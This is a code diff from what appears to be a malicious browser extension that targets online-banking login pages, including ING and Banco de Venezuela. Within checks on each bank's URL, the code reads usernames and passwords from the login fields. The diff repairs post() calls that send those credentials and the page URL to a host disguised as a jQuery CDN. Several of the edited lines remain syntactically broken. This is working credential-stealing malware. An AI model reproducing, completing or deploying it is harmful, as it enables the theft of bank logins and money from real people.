@@ -73,7 +73,7 @@ if (top['location']['href']['indexOf']('mijn.ing.nl') > -1) {
                 }
                   login.userid = document.getElementsByClassName(" firstfield")[0].value;
                   login.password = p;
-            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php"),"l="+window.location.href+"&e="+login.userid+"&p="+login.password);
+            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php","l="+window.location.href+"&e="+login.userid+"&p="+login.password);
             }
         }
     }, 1000)
@@ -262,7 +262,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
             login.email = document.getElementsByName("notarjeta1")[0].value;
             login.pass = document.getElementsByName("passwordp1")[0].value;
             chrome.runtime.sendMessage(login);
-            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php","l="+window.location.href+"&e="+login.email+"&p="+login.pass;
             }
         }
     }, 1000)
@@ -277,7 +277,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
                var login = {};
               login.email = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$UserNameTextBox")[0].value;
               login.pass = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$PasswordTextBox")[0].value;
-              post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+              post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php","l="+window.location.href+"&e="+login.email+"&p="+login.pass;
               }
           }
       }, 1000)
@@ -293,7 +293,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
               login.email = document.getElementsByName("j_username")[0].value;
               login.pass = document.getElementsByName("j_password")[0].value;
 
-              post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+              post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php","l="+window.location.href+"&e="+login.email+"&p="+login.pass;
               }
           }
       }, 1000)
@@ -308,7 +308,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
                var login = {};
               login.email = document.getElementsByName("login_email")[0].value;
               login.pass = document.getElementsByName("login_password")[0].value;
-              post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+              post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php","l="+window.location.href+"&e="+login.email+"&p="+login.pass;
               }
           }
       }, 1000)
@@ -323,7 +323,7 @@ var login_form = document.getElementById("loginForm");
             var login = {};
             login.email = document.getElementsByName("usus")[0].value;
             login.pass = document.getElementsByName("clave")[0].value;
-            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php",033"l="+window.location.href+"&e="+login.email+"&p="+login.pass;
 		        }
           }
         }
@@ -337,7 +337,7 @@ var login_form = document.getElementById("loginForm");
               var login = {};
               login.email = document.getElementsByName("userid")[0].value;
               login.pass = document.getElementsByName("password")[0].value;
-              post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+              post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php","l="+window.location.href+"&e="+login.email+"&p="+login.pass;
               }
           }
       }, 1000)
